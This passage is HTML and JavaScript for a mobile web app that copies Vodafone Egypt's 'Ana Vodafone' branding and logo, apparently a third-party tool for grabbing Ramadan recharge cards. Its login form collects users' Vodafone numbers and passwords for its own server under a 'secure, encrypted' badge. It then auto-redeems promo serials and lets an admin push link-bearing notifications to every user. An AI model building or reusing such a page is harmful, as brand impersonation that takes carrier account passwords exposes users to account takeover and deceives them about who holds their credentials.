.units-slider::-moz-range-thumb{width:22px;height:22px;border-radius:50%;background:linear-gradient(135deg,var(--red2),var(--red));border:2px solid rgba(255,80,80,.3);cursor:pointer;}
.units-range-labels{display:flex;justify-content:space-between;font-size:.48rem;color:var(--ink3);font-weight:700;margin-top:6px;padding:0 4px;}
.units-tip{display:flex;align-items:center;gap:6px;background:rgba(200,168,75,.05);border:1px solid rgba(200,168,75,.12);border-radius:10px;padding:8px 12px;margin-top:10px;font-size:.58rem;color:var(--ink3);}
.units-tip i{color:var(--g2);font-size:.6rem;flex-shrink:0;}
</style>
</head>
<body>

<!-- ══ SPLASH SCREEN ══ -->
<!-- ══ SPLASH SCREEN ══ -->
<div id="s-splash" class="screen active">

  <!-- bg -->
  <div class="sp-bg-radial"></div>
  <div class="sp-dots"></div>

  <!-- center -->
  <div class="sp-stage">

    <!-- logo -->
    <div class="sp-logo-wrap">
      <div class="sp-halo2"></div>
      <div class="sp-halo"></div>
      <div class="sp-spin-ring"></div>
      <div class="sp-icon">
        <div class="sp-icon-inner">
          <svg width="70" height="70" viewBox="0 0 70 70" fill="none">
            <path d="M35 6C18.4 6 5 18.6 5 34.2c0 8.8 4.4 16.6 11.3 21.5V64l10.4-7c2.8.7 5.7 1.1 8.7 1.1C52.6 58.2 65 46 65 34.2S52.6 6 35 6z" fill="white" opacity="0.93"/>
            <path d="M22 24L35 47L48 24" stroke="#d40000" stroke-width="5.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
          </svg>
        </div>
      </div>
      <div class="sp-bolt"><i class="fas fa-bolt"></i></div>
    </div>

    <!-- text -->
    <div class="sp-label">أنا فودافون</div>

    <div class="sp-name">
      <span class="sp-nl" style="--n:0">Y</span>
      <span class="sp-nl" style="--n:1">N</span>
      <span class="sp-nl" style="--n:2">H</span>
      <span class="sp-nl" style="--n:3">S</span>
      <span class="sp-nl" style="--n:4">A</span>
      <span class="sp-nl" style="--n:5">I</span>
      <span class="sp-nl" style="--n:6">A</span>
      <span class="sp-nl" style="--n:7">T</span>
    </div>

    <div class="sp-sub">كروت رمضان &nbsp;<span>·</span>&nbsp; شحن تلقائي</div>

  </div>

  <!-- bottom -->
  <div class="sp-foot">
    <div class="sp-bar-track">
      <div class="sp-bar-fill"></div>
    </div>
    <div class="sp-meta">
      <div class="sp-ver">v2.1 · Vodafone EG</div>
      <div class="sp-brand">
        <div class="sp-brand-dot"></div>
        <div class="sp-brand-txt">TALASHNY</div>
        <div class="sp-brand-dot"></div>
      </div>
    </div>
  </div>

</div>


<!-- ══ LOGIN ══ -->
<div id="s-login" class="screen">
  <div class="login-wrap">

    <!-- Hero -->
    <div class="login-hero">
      <div class="login-logo-outer">
        <div class="login-logo-circle">
          <svg class="login-vmark" viewBox="0 0 60 60" fill="none">
            <path d="M32 7C17.6 7 6 18 6 31.5c0 7.6 3.7 14.4 9.5 18.8V54l8.8-5.9c2.3.6 4.7.9 7.3.9 14.4 0 26-11 26-24.5S46.4 7 32 7z" fill="white" opacity="0.9"/>
            <path d="M19 22l13 22 13-22" stroke="#e60000" stroke-width="5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
          </svg>
        </div>
      </div>
      <div class="login-app-tag">
        <div class="login-app-tag-dot"></div>
        أنا فودافون
      </div>
      <div class="login-title-row">
        <span class="login-letter" style="--i:0">Y</span>
        <span class="login-letter" style="--i:1">N</span>
        <span class="login-letter" style="--i:2">H</span>
        <span class="login-letter" style="--i:3">S</span>
        <span class="login-letter" style="--i:4">A</span>
        <span class="login-letter" style="--i:5">l</span>
        <span class="login-letter" style="--i:6">A</span>
        <span class="login-letter" style="--i:7">T</span>
      </div>
      <div class="login-sub">سجّل دخولك بحساب فودافون</div>
    </div>

    <!-- Form -->
    <div id="errBox" class="err-box" style="display:none">
      <i class="fas fa-circle-exclamation"></i>
      <span id="errMsg"></span>
    </div>
    <div class="login-card">
      <div class="card-sep">تسجيل الدخول</div>
      <div class="lf-field">
        <label>رقم الموبايل</label>
        <div class="input-box">
          <input type="tel" id="inpNum" placeholder="01XXXXXXXXX" inputmode="tel" autocomplete="tel"/>
          <span class="ico"><i class="fas fa-mobile-screen-button"></i></span>
        </div>
      </div>
      <div class="lf-field">
        <label>كلمة المرور</label>
        <div class="input-box">
          <input type="password" id="inpPw" placeholder="••••••••" autocomplete="current-password"/>
          <span class="ico"><i class="fas fa-lock"></i></span>
        </div>
      </div>
      <button class="btn-login" id="loginBtn" onclick="doLogin()">
        <i class="fas fa-right-to-bracket"></i>&nbsp; دخـول
      </button>
    </div>
    <div class="sec-note"><i class="fas fa-shield-halved"></i> اتصال آمن ومشفر بالكامل</div>
  </div>
</div>

<!-- APP -->
<div id="s-app" class="screen">
  <div class="banner">
    <div class="banner-left">
      <div class="banner-logo">
        <img src="https://tlashane.serv00.net/vo/vodafone2.png" alt="" onerror="this.style.display='none';this.parentElement.innerHTML='<i class=\'fas fa-bolt\' style=\'color:var(--g1);font-size:.9rem\'></i>'"/>
      </div>
      <div class="banner-letters">
        <span style="--i:0">Y</span><span style="--i:1">N</span><span style="--i:2">H</span>
        <span style="--i:3">S</span><span style="--i:4">A</span><span style="--i:5">L</span>
        <span style="--i:6">A</span><span style="--i:7">T</span>
      </div>
    </div>
    <div class="banner-right">
      <div class="tbar-num" id="topNum">—</div>
      <div class="tbar-live">
        <div class="live-dot" id="liveDotBtn" onclick="handleLiveTap()"></div>
        متصل
      </div>
    </div>
  </div>

  <div class="appwrap">
    <div class="toprow">
      <div></div>
      <button class="btn-logout" id="logoutBtn"><i class="fas fa-power-off"></i>&nbsp;خروج</button>
    </div>
    <div class="stats-bar">
      <div class="stat s-red"><div class="stat-val" id="st-total">—</div><div class="stat-lbl">كروت</div></div>
      <div class="stat s-gold"><div class="stat-val" id="st-max">—</div><div class="stat-lbl">أعلى فئة</div></div>
      <div class="stat s-green"><div class="stat-val"><i class="fas fa-circle" style="font-size:.5rem"></i><span id="st-online">—</span></div><div class="stat-lbl">متصل الآن</div></div>
    </div>
    <div class="timer-row">
      <div class="t-ring">
        <svg viewBox="0 0 40 40">
          <circle class="t-bg" cx="20" cy="20" r="16"/>
          <circle class="t-prog" id="tprog" cx="20" cy="20" r="16"/>
        </svg>
        <div class="t-count" id="tnum">7</div>
      </div>
      <div class="t-info">
        <div class="t-label">تحديث تلقائي</div>
        <div class="t-sub">كل 7 ثواني</div>
      </div>
      <div class="live-badge"><div class="lb-dot"></div>LIVE</div>
    </div>

    <!-- AUTO-CHARGE TOGGLE BAR -->
    <div class="auto-toggle-bar">
      <div class="auto-toggle-info">
        <div class="auto-toggle-icon"><i class="fas fa-bolt"></i></div>
        <div class="auto-toggle-text">
          <div class="at-title">الشحن التلقائي</div>
          <div class="at-sub">يشحن أونلاين فور ظهور الكروت</div>
          <div class="at-pref" id="autoPrefDisplay">
            <i class="fas fa-circle-dot" style="font-size:.4rem"></i>
            <span>اضغط ضبط للتخصيص</span>
          </div>
        </div>
      </div>
      <button class="btn-configure-auto" onclick="openAutoSetup()">
        <i class="fas fa-sliders"></i>&nbsp;ضبط
      </button>
      <label class="toggle-switch" style="margin-right:8px">
        <input type="checkbox" id="autoToggle" onchange="onAutoToggleChange()"/>
        <div class="toggle-track"></div>
      </label>
    </div>

    <div class="sec-row">
      <div class="sec-title"><div class="sec-line"></div>الكروت المتاحة</div>
      <div class="sec-badge" id="ccnt">—</div>
    </div>
    <div id="cardsWrap">
      <div class="empty-wrap"><i class="fas fa-spinner fa-spin" style="color:var(--red);opacity:.8"></i><p>جاري التحميل...</p></div>
    </div>
  </div>

  <nav class="botnav">
    <a href="https://t.me/FY_TF" target="_blank" class="nav-link"><i class="fab fa-telegram-plane"></i><span>تيليجرام</span></a>
    <a href="https://wa.me/message/U6AIKBGFCNCQK1" target="_blank" class="nav-link"><i class="fab fa-whatsapp"></i><span>واتساب</span></a>
    <a href="https://www.facebook.com/VI808IV" target="_blank" class="nav-link"><i class="fab fa-facebook-f"></i><span>فيسبوك</span></a>
  </nav>
</div>

<!-- ══ AUTO-CHARGE SETUP MODAL ══ -->
<div class="modal-overlay" id="autoSetupModal">
  <div class="modal-sheet">
    <div class="modal-drag"></div>
    <div class="modal-head">
      <div class="modal-head-row">
        <div class="modal-head-left">
          <div class="modal-head-icon"><i class="fas fa-bolt"></i></div>
          <div>
            <div class="modal-head-title">إعداد الشحن التلقائي</div>
            <div class="modal-head-sub">حدد الوحدات وطريقة الشحن</div>
          </div>
        </div>
        <div class="modal-close" onclick="closeAutoSetup()"><i class="fas fa-xmark"></i></div>
      </div>
    </div>
    <div class="modal-body">

      <!-- UNITS SECTION -->
      <div class="section-label">عدد الوحدات المطلوبة</div>
      <div class="units-section">
        <div class="units-display-row">
          <button class="units-btn" onclick="changeUnits(-1)" id="unitsMinus"><i class="fas fa-minus"></i></button>
          <div class="units-val-wrap">
            <div class="units-num" id="unitsNum">500</div>
            <div class="units-label">وحدة كحد أدنى</div>
          </div>
          <button class="units-btn" onclick="changeUnits(1)" id="unitsPlus"><i class="fas fa-plus"></i></button>
        </div>
        <div class="units-presets">
          <div class="unit-preset" onclick="setUnitsPreset(100)">100</div>
          <div class="unit-preset" onclick="setUnitsPreset(250)">250</div>
          <div class="unit-preset active" onclick="setUnitsPreset(500)">500</div>
          <div class="unit-preset" onclick="setUnitsPreset(1000)">1000</div>
          <div class="unit-preset max-preset" onclick="setUnitsPreset(0)"><i class="fas fa-infinity" style="font-size:.55rem"></i>&nbsp;أي عدد</div>
        </div>
        <div class="units-slider-wrap">
          <input type="range" class="units-slider" id="unitsSlider" min="0" max="2000" step="50" value="500" oninput="onSliderInput(this.value)"/>
          <div class="units-range-labels"><span>أي عدد</span><span>500</span><span>1000</span><span>1500</span><span>2000+</span></div>
        </div>
        <div class="units-tip"><i class="fas fa-lightbulb"></i> سيشحن بالكرت اللي وحداته أكبر من أو تساوي العدد المحدد</div>
      </div>

      <!-- METHOD SECTION -->
      <div class="section-label">طريقة الشحن</div>
      <div class="method-grid">
        <div class="method-tile selected" id="method-online" onclick="selectMethod('online')">
          <div class="method-check"><i class="fas fa-check"></i></div>
          <div class="method-icon"><i class="fas fa-bolt"></i></div>
          <div class="method-label">شحن أونلاين</div>
          <div class="method-sub">مباشر عبر التطبيق بدون أي خطوات</div>
        </div>
        <div class="method-tile" id="method-ussd" onclick="selectMethod('ussd')">
          <div class="method-check"><i class="fas fa-check"></i></div>
          <div class="method-icon"><i class="fas fa-phone"></i></div>
          <div class="method-label">شحن بالهاتف</div>
          <div class="method-sub">USSD — بيفتح المكالمة تلقائياً</div>
        </div>
      </div>

      <!-- SUMMARY -->
      <div class="section-label">ملخص الإعداد</div>
      <div class="summary-box" id="setupSummary">
        <div class="sum-icon"><i class="fas fa-circle-info"></i></div>
        <div class="sum-text">
          <div class="sum-empty">اختار فئة وطريقة شحن لتفعيل الشحن التلقائي</div>
        </div>
      </div>

      <button class="btn-confirm-auto" id="btnConfirmAuto" onclick="confirmAutoSetup()" disabled>
        <i class="fas fa-bolt"></i>&nbsp;تأكيد وتفعيل الشحن التلقائي
      </button>
    </div>
  </div>
</div>

<!-- SLIDE NOTIFICATION -->
<div class="notif-slide" id="notifSlide" onclick="notifClick()">
  <div class="notif-top-row">
    <div class="notif-slide-icon" id="notifIcon"><i class="fas fa-bell"></i></div>
    <div class="notif-slide-body">
      <div class="notif-slide-title"><span id="notifTitle">TALASHNY</span><span class="notif-slide-app">الآن</span></div>
      <div class="notif-slide-text" id="notifText"></div>
    </div>
  </div>
  <a class="notif-action-btn" id="notifActionBtn" style="display:none" target="_blank">
    <i class="fas fa-arrow-up-right-from-square"></i><span id="notifBtnLabel">افتح الرابط</span>
  </a>
  <div class="notif-bar"><div class="notif-bar-fill" id="notifBarFill"></div></div>
</div>

<!-- ADMIN OVERLAY -->
<div class="admin-overlay" id="adminOverlay">
  <div class="admin-panel">
    <div class="admin-drag-bar"></div>
    <div class="admin-head">
      <div class="admin-head-left">
        <div class="admin-head-icon"><i class="fas fa-tower-broadcast"></i></div>
        <div><div class="admin-head-title">ADMIN</div><div class="admin-head-sub">لوحة التحكم</div></div>
      </div>
      <div class="admin-close" onclick="closeAdmin()"><i class="fas fa-xmark"></i></div>
    </div>
    <div class="admin-auth" id="adminAuth">
      <div class="admin-auth-title">أدخل كلمة المرور</div>
      <div class="pin-dots" id="pinDots">
        <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
        <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
      </div>
      <div class="auth-err" id="authErr">❌ كلمة المرور غلط</div>
      <div class="pw-field-wrap">
        <span class="ico"><i class="fas fa-key"></i></span>
        <input type="password" id="adminPwInput" placeholder="••••••••••" onkeydown="if(event.key==='Enter')checkAdminPw()"/>
      </div>
      <button class="btn-auth" onclick="checkAdminPw()"><i class="fas fa-unlock-keyhole"></i>&nbsp;دخول</button>
    </div>
    <div class="admin-content" id="adminContent">
      <div class="admin-tabs">
        <div class="admin-tab active" id="tab-send"     onclick="switchTab('send')"><i class="fas fa-paper-plane"></i>&nbsp;إرسال</div>
        <div class="admin-tab"        id="tab-schedule" onclick="switchTab('schedule')"><i class="fas fa-calendar-clock"></i>&nbsp;جدولة</div>
        <div class="admin-tab"        id="tab-history"  onclick="switchTab('history')"><i class="fas fa-clock-rotate-left"></i>&nbsp;السجل</div>
      </div>
      <div class="admin-tab-body" id="tabSend">
        <div class="admin-stats">
          <div class="adm-stat"><div class="adm-stat-val" id="adm-online">—</div><div class="adm-stat-lbl">متصل الآن</div></div>
          <div class="adm-stat"><div class="adm-stat-val" id="adm-today">—</div><div class="adm-stat-lbl">شحنات اليوم</div></div>
          <div class="adm-stat"><div class="adm-stat-val" id="adm-views" style="color:var(--g2)">—</div><div class="adm-stat-lbl">شافوا الإشعار</div></div>
        </div>
        <div class="admin-sep">نوع الإشعار</div>
        <div class="admin-type-grid">
          <div class="type-btn active-info" id="type-info" onclick="setType('info')"><i class="fas fa-circle-info" style="color:#80ccee"></i>معلومة</div>
          <div class="type-btn" id="type-ok"  onclick="setType('ok')"><i class="fas fa-circle-check" style="color:var(--green)"></i>نجاح</div>
          <div class="type-btn" id="type-err" onclick="setType('err')"><i class="fas fa-circle-exclamation" style="color:#ff8888"></i>تحذير</div>
        </div>
        <div class="admin-field">
          <label class="admin-label">عنوان الإشعار</label>
          <input type="text" class="admin-input" id="notifTitleInput" placeholder="TALASHNY" value="TALASHNY" oninput="updatePreview()"/>
        </div>
        <div class="admin-field">
          <label class="admin-label">نص الرسالة</label>
          <textarea class="admin-textarea" id="notifMsgInput" rows="3" placeholder="اكتب رسالتك هنا..." oninput="updatePreview()"></textarea>
        </div>
        <div class="admin-field">
          <label class="admin-label"><i class="fas fa-image" style="margin-left:4px"></i>رابط أيقونة (اختياري)</label>
          <div class="input-box" style="background:var(--l2)">
            <input type="url" id="notifIconInput" placeholder="https://..." style="font-size:.72rem;direction:ltr" oninput="updatePreview()"/>
            <span class="ico"><i class="fas fa-link"></i></span>
          </div>
        </div>
        <div class="admin-field">
          <label class="admin-label"><i class="fas fa-arrow-up-right-from-square" style="margin-left:4px"></i>رابط زرار (اختياري)</label>
          <div class="input-box" style="background:var(--l2);margin-bottom:7px">
            <input type="url" id="notifLinkInput" placeholder="https://..." style="font-size:.72rem;direction:ltr" oninput="updatePreview()"/>
            <span class="ico"><i class="fas fa-link"></i></span>
          </div>
          <div class="input-box" style="background:var(--l2)">
            <input type="text" id="notifBtnInput" placeholder="نص الزرار..." style="font-size:.72rem" oninput="updatePreview()"/>
            <span class="ico"><i class="fas fa-i-cursor"></i></span>
          </div>
        </div>
        <div class="admin-sep">معاينة</div>
        <div class="notif-preview" id="notifPreview">
          <div class="prev-icon" id="prevIconWrap"><i class="fas fa-bell"></i></div>
          <div style="flex:1">
            <div class="prev-app">TALASHNY • الآن</div>
            <div class="prev-title" id="prevTitle">TALASHNY</div>
            <div class="prev-text" id="prevText">نص الرسالة هيظهر هنا...</div>
            <div id="prevBtn" style="display:none;margin-top:7px">
              <span style="display:inline-flex;align-items:center;gap:4px;font-size:.55rem;font-weight:800;color:var(--red);background:rgba(230,0,0,.08);border:1px solid rgba(230,0,0,.2);padding:4px 10px;border-radius:6px">
                <i class="fas fa-arrow-up-right-from-square"></i><span id="prevBtnLabel">افتح الرابط</span>
              </span>
            </div>
          </div>
        </div>
        <div class="admin-field" style="margin-top:14px">
          <label class="admin-label">مدة الظهور</label>
          <div class="admin-dur-grid">
            <div class="dur-btn active" onclick="setDur(this,60)">1 د</div>
            <div class="dur-btn" onclick="setDur(this,300)">5 د</div>
            <div class="dur-btn" onclick="setDur(this,600)">10 د</div>
            <div class="dur-btn" onclick="setDur(this,1800)">30 د</div>
            <div class="dur-btn" onclick="setDur(this,3600)">ساعة</div>
          </div>
        </div>
        <div class="admin-btns" style="margin-top:10px">
          <button class="btn-send-notif" id="btnSendNotif" onclick="sendNotif()"><i class="fas fa-paper-plane"></i>&nbsp;إرسال للكل</button>
          <button class="btn-clear-notif" onclick="clearNotif()"><i class="fas fa-trash"></i></button>
        </div>
      </div>
      <div class="admin-tab-body" id="tabSchedule" style="display:none">
        <div class="admin-sep" style="margin-top:0">إشعار جديد مجدول</div>
        <div class="admin-type-grid">
          <div class="type-btn active-info" id="stype-info" onclick="setSchedType('info')"><i class="fas fa-circle-info" style="color:#80ccee"></i>معلومة</div>
          <div class="type-btn" id="stype-ok"  onclick="setSchedType('ok')"><i class="fas fa-circle-check" style="color:var(--green)"></i>نجاح</div>
          <div class="type-btn" id="stype-err" onclick="setSchedType('err')"><i class="fas fa-circle-exclamation" style="color:#ff8888"></i>تحذير</div>
        </div>
        <div class="admin-field">
          <label class="admin-label">عنوان الإشعار</label>
          <input type="text" class="admin-input" id="schedTitleInput" placeholder="TALASHNY" value="TALASHNY"/>
        </div>
        <div class="admin-field">
          <label class="admin-label">نص الرسالة</label>
          <textarea class="admin-textarea" id="schedMsgInput" rows="2" placeholder="اكتب الرسالة..."></textarea>
        </div>
        <div class="admin-field">
          <label class="admin-label"><i class="fas fa-calendar-clock" style="margin-left:4px"></i>وقت الإرسال</label>
          <input type="datetime-local" id="schedTimeInput" class="admin-input" style="direction:ltr"/>
        </div>
        <div class="admin-field">
          <label class="admin-label">رابط زرار (اختياري)</label>
          <div class="input-box" style="background:var(--l2)">
            <input type="url" id="schedLinkInput" placeholder="https://..." style="font-size:.72rem;direction:ltr"/>
            <span class="ico"><i class="fas fa-link"></i></span>
          </div>
        </div>
        <button class="btn-send-notif" style="width:100%;margin-top:4px" id="btnAddSched" onclick="addSchedule()">
          <i class="fas fa-calendar-plus"></i>&nbsp;جدولة الإشعار
        </button>
        <div class="admin-sep">المجدولة</div>
        <div class="sched-list" id="schedList"><div class="hist-empty">لا توجد إشعارات مجدولة</div></div>
      </div>
      <div class="admin-tab-body" id="tabHistory" style="display:none">
        <div class="hist-list" id="histList"><div class="hist-empty">لا يوجد سجل بعد</div></div>
      </div>
    </div>
  </div>
</div>

<div class="toast" id="toastEl"></div>

<script>
const _=id=>document.getElementById(id);
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function showToast(msg,t=''){const el=_('toastEl');el.textContent=msg;el.className='toast show'+(t?' '+t:'');clearTimeout(el._t);el._t=setTimeout(()=>el.classList.remove('show'),2800);}
document.addEventListener('contextmenu',e=>e.preventDefault());

function goTo(id){
  document.querySelectorAll('.screen').forEach(s=>{
    if(s.id==='s-splash') return; // splash managed separately
    s.classList.toggle('active',s.id===id);
  });
  if(id==='s-app') _(id).scrollTop=0;
}

// ══ SPLASH ══
function dismissSplash(nextScreen){
  const splash = _('s-splash');
  splash.classList.add('fade-out');
  setTimeout(()=>{
    splash.classList.remove('active','fade-out');
    splash.style.display='none';
    _(nextScreen).classList.add('active');
  }, 600);
}

let pingInt=null;
function startPing(){fetch('/ping');clearInterval(pingInt);pingInt=setInterval(()=>fetch('/ping'),15000);}
function stopPing(){clearInterval(pingInt);}

// ══ AUTO-CHARGE SETTINGS ══
let autoSettings = {
  enabled: false,
  method: 'online', // 'online' | 'ussd'
  minUnits: 500     // 0 = أي عدد
};
let autoCharged = false;
let lastPromosList = [];

function loadAutoSettings(){
  try{
    const s = JSON.parse(localStorage.getItem('autoSettings')||'{}');
    if(s.method) autoSettings.method = s.method;
    if(s.enabled !== undefined) autoSettings.enabled = s.enabled;
    if(s.minUnits !== undefined) autoSettings.minUnits = s.minUnits;
  }catch{}
  _('autoToggle').checked = autoSettings.enabled;
  updateAutoPrefDisplay();
}

function saveAutoSettings(){
  localStorage.setItem('autoSettings', JSON.stringify(autoSettings));
}

function onAutoToggleChange(){
  const checked = _('autoToggle').checked;
  autoSettings.enabled = checked;
  saveAutoSettings();
  updateAutoPrefDisplay();
  if(checked){ showToast('✅ الشحن التلقائي مفعّل','ok'); autoCharged=false; }
  else{ showToast('⛔ الشحن التلقائي معطّل',''); autoCharged=false; }
}

function updateAutoPrefDisplay(){
  const el = _('autoPrefDisplay');
  if(!el) return;
  const methLabel = autoSettings.method === 'online' ? 'أونلاين' : 'بالهاتف';
  const unitsLabel = autoSettings.minUnits > 0 ? autoSettings.minUnits + '+ وحدة' : 'أي وحدات';
  el.innerHTML = `<i class="fas fa-bolt" style="font-size:.4rem;color:var(--red)"></i><span>${unitsLabel} — ${methLabel}</span>`;
}

// ══ MODAL ══
let selectedAutoMethod = 'online';
let selectedMinUnits = 500;

function openAutoSetup(){
  selectedAutoMethod = autoSettings.method || 'online';
  selectedMinUnits   = autoSettings.minUnits !== undefined ? autoSettings.minUnits : 500;
  _('autoSetupModal').classList.add('open');
  selectMethod(selectedAutoMethod);
  setUnitsUI(selectedMinUnits);
  updateSetupSummary();
}

function closeAutoSetup(){
  _('autoSetupModal').classList.remove('open');
}

// ── UNITS LOGIC ──
function setUnitsUI(val){
  selectedMinUnits = val;
  const numEl = _('unitsNum');
  if(numEl){
    numEl.textContent = val === 0 ? '∞' : val;
    numEl.classList.remove('changed');
    void numEl.offsetWidth;
    numEl.classList.add('changed');
    setTimeout(()=>numEl.classList.remove('changed'), 400);
  }
  const slider = _('unitsSlider');
  if(slider) slider.value = val;
  // Update presets
  document.querySelectorAll('.unit-preset').forEach(p=>{
    const pv = p.getAttribute('onclick');
    p.classList.toggle('active', pv && pv.includes(`(${val})`));
  });
  updateSetupSummary();
}

function changeUnits(delta){
  const step = 50;
  let v = selectedMinUnits === 0 ? 0 : selectedMinUnits;
  v = Math.max(0, Math.min(2000, v + delta * step));
  setUnitsUI(v);
}

function setUnitsPreset(val){
  setUnitsUI(val);
}

function onSliderInput(val){
  setUnitsUI(parseInt(val));
}

_('autoSetupModal').addEventListener('click', function(e){
  if(e.target === this) closeAutoSetup();
});

function selectMethod(method){
  selectedAutoMethod = method;
  _('method-online').classList.toggle('selected', method==='online');
  _('method-ussd').classList.toggle('selected', method==='ussd');
  updateSetupSummary();
}

function updateSetupSummary(){
  const box = _('setupSummary');
  const methIcon = selectedAutoMethod==='online' ? 'fa-bolt' : 'fa-phone';
  const methLabel = selectedAutoMethod==='online' ? 'شحن أونلاين مباشر' : 'شحن عبر USSD بالهاتف';
  const unitsChip = selectedMinUnits > 0
    ? `<span style="display:inline-flex;align-items:center;gap:3px;margin-top:5px;font-size:.5rem;font-weight:700;color:var(--g2);background:rgba(200,168,75,.07);border:1px solid rgba(200,168,75,.15);padding:2px 9px;border-radius:100px"><i class="fas fa-layer-group"></i>&nbsp;${selectedMinUnits}+ وحدة كحد أدنى</span>`
    : `<span style="display:inline-flex;align-items:center;gap:3px;margin-top:5px;font-size:.5rem;font-weight:700;color:var(--ink3);background:rgba(255,255,255,.04);padding:2px 9px;border-radius:100px"><i class="fas fa-infinity"></i>&nbsp;أي عدد وحدات</span>`;
  box.innerHTML = `
    <div class="sum-icon" style="color:var(--green);background:rgba(0,200,90,.08);border-color:rgba(0,200,90,.2)"><i class="fas fa-check-double"></i></div>
    <div class="sum-text">
      <div class="sum-main"><i class="fas ${methIcon}" style="margin-left:4px;color:var(--red)"></i>${methLabel}</div>
      <div>${unitsChip}</div>
    </div>`;
}

function confirmAutoSetup(){
  autoSettings.method   = selectedAutoMethod;
  autoSettings.minUnits = selectedMinUnits;
  autoSettings.enabled  = true;
  saveAutoSettings();
  _('autoToggle').checked = true;
  updateAutoPrefDisplay();
  closeAutoSetup();
  autoCharged = false;
  showToast('✅ تم ضبط الشحن التلقائي وتفعيله','ok');
}

// ══ MAIN ══
(async()=>{
  // minimum splash display time
  const splashPromise = new Promise(r=>setTimeout(r, 2200));
  let loggedIn = false;
  let loggedNumber = '';

  try{
    const r=await fetch('/check');const d=await r.json();
    if(d.logged){ loggedIn=true; loggedNumber=d.number; }
  }catch{}

  // Wait for splash to finish showing
  await splashPromise;

  if(loggedIn){
    _('topNum').textContent=loggedNumber;
    loadAutoSettings();
    dismissSplash('s-app');
    startPing();startCycle();
  } else {
    dismissSplash('s-login');
  }
})();

async function doLogin(){
  const num=_('inpNum').value.trim(),pw=_('inpPw').value.trim();
  if(!num||!pw)return;
  const btn=_('loginBtn');btn.disabled=true;btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>&nbsp;جاري التحقق...';
  _('errBox').style.display='none';
  try{
    const fd=new FormData();fd.append('number',num);fd.append('password',pw);
    const r=await fetch('/login',{method:'POST',body:fd});const d=await r.json();
    if(d.ok){
      _('topNum').textContent=d.number;
      navigator.vibrate&&navigator.vibrate([30,20,30]);
      loadAutoSettings();
      goTo('s-app');startPing();startCycle();
    }
    else{_('errMsg').textContent=d.error||'الرقم أو الباسورد غلط';_('errBox').style.display='flex';}
  }catch{_('errMsg').textContent='خطأ في الاتصال';_('errBox').style.display='flex';}
  btn.disabled=false;btn.innerHTML='<i class="fas fa-right-to-bracket"></i>&nbsp; دخـول';
}
_('inpPw')?.addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
_('inpNum')?.addEventListener('keydown',e=>{if(e.key==='Enter')_('inpPw').focus();});
_('logoutBtn').onclick=async()=>{
  await fetch('/logout');
  clearInterval(timerInt);stopPing();
  autoCharged=false;
  // Reset splash for re-entry if needed, just go to login
  goTo('s-login');
};

function copySerial(btn){
  const s=btn.closest('.card-serial').querySelector('.serial-val').textContent.trim();
  const ok=()=>{const o=btn.innerHTML;btn.innerHTML='<i class="fas fa-check" style="color:var(--green)"></i>';setTimeout(()=>btn.innerHTML=o,1500);showToast('✅ تم نسخ الكود','ok');};
  if(navigator.clipboard)navigator.clipboard.writeText(s).then(ok).catch(fb);else fb();
  function fb(){const t=document.createElement('textarea');t.value=s;t.style.cssText='position:fixed;opacity:0';document.body.appendChild(t);t.select();try{document.execCommand('copy')}catch{}document.body.removeChild(t);ok();}
}

async function chargeCard(serial,amount,btn){
  btn.classList.add('loading');btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>&nbsp;<span>جاري...</span>';
  try{
    const r=await fetch('/redeem?serial='+encodeURIComponent(serial)+'&amount='+encodeURIComponent(amount));const d=await r.json();
    if(d.ok){showToast('✅ تم الشحن بنجاح','ok');btn.classList.remove('loading');btn.classList.add('done');btn.innerHTML='<i class="fas fa-check"></i>&nbsp;<span>تم الشحن</span>';}
    else{showToast('❌ فشل الشحن','err');btn.classList.remove('loading');btn.innerHTML='<i class="fas fa-bolt"></i>&nbsp;<span>شحن أونلاين</span>';autoCharged=false;}
  }catch{showToast('❌ خطأ في الاتصال','err');btn.classList.remove('loading');btn.innerHTML='<i class="fas fa-bolt"></i>&nbsp;<span>شحن أونلاين</span>';autoCharged=false;}
}

function renderCards(list,online){
  const wrap=_('cardsWrap'),cnt=_('ccnt');
  if(online!==undefined)_('st-online').textContent=online;
  lastPromosList = list || [];
  if(!list||!list.length){
    cnt.textContent='0';_('st-total').textContent='0';_('st-max').textContent='—';
    wrap.innerHTML='<div class="empty-wrap"><i class="fas fa-inbox"></i><p>لا توجد عروض متاحة الآن</p><small>يتجدد البحث تلقائياً...</small></div>';
    return;
  }
  cnt.textContent=list.length+' كرت';_('st-total').textContent=list.length;
  const bestAmt=Math.max(...list.map(c=>c.amount));_('st-max').textContent=bestAmt+' ج';

  // Determine auto-charge target: highest amount card that meets minUnits
  let autoTarget = null;
  if(autoSettings.enabled && !autoCharged){
    const minU = autoSettings.minUnits || 0;
    const eligible = minU > 0 ? list.filter(p => p.gift >= minU) : list;
    if(eligible.length > 0){
      const bestEligibleAmt = Math.max(...eligible.map(p=>p.amount));
      autoTarget = eligible.find(p=>p.amount===bestEligibleAmt);
    }
  }

  wrap.innerHTML=list.map((p,i)=>{
    const ussd='*858*'+p.serial.replace(/\s/g,'')+'#';const isBest=p.amount===bestAmt;
    const isAutoTarget = autoTarget && p.serial===autoTarget.serial;
    return`<div class="promo-card${isBest?' best-card':''}" style="--i:${i}">
      <div class="card-stripe"></div>
      <div class="card-body">
        <div class="card-chips">
          ${isBest?'<span class="chip chip-best"><i class="fas fa-star"></i>الأفضل</span>':''}
          ${isAutoTarget?'<span class="chip chip-auto"><i class="fas fa-bolt"></i>شحن تلقائي</span>':''}
          <span class="chip chip-gold"><i class="fas fa-gift"></i>${esc(p.gift)} وحدة</span>
          <span class="chip chip-blue"><i class="fas fa-rotate"></i>${esc(p.remaining)} متبقي</span>
        </div>
        <div class="card-amount"><div class="amt-num">${esc(p.amount)}</div><div class="amt-cur">جنيه</div></div>
      </div>
      <div class="card-serial">
        <span class="serial-val">${esc(p.serial)}</span>
        <button onclick="copySerial(this)" class="btn-copy"><i class="fas fa-clone"></i></button>
      </div>
      <div class="card-btns">
